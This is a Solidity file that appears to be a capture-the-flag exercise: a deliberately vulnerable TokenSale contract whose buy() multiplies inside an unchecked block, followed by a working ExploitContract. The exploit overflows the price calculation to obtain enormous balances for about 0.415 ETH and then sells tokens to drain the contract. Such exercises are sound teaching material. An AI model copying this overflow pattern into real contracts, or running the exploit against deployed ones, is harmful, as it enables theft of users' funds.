// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import {console} from "forge-std/console.sol";

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total);

        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenSale public tokenSale;

    constructor(TokenSale _tokenSale) {
        tokenSale = _tokenSale;
    }

    receive() external payable {}
    // write your exploit functions below

    function exploit() public payable {
        uint256 x;
        unchecked {
            // + 1  = 415992086870360064
            // + 2  = 1415992086870360064
            // + 3  = 2415992086870360064
            uint256 numOfTokens = (type(uint256).max / (1 ether)) + 1 ;
            x += numOfTokens * (1 ether);
        }
        console.log("X: %s", x);
        console.log("type(uint256).max: %s", type(uint256).max);

        // I have used value 415992086870360064, as that is value of wei I need to send to buy huge amount of tokens. That is less than 1 ether, 0.415 ETH
        tokenSale.buy{value: 415992086870360064}((type(uint256).max / (1 ether)) + 1);

        tokenSale.sell(1);
    }
}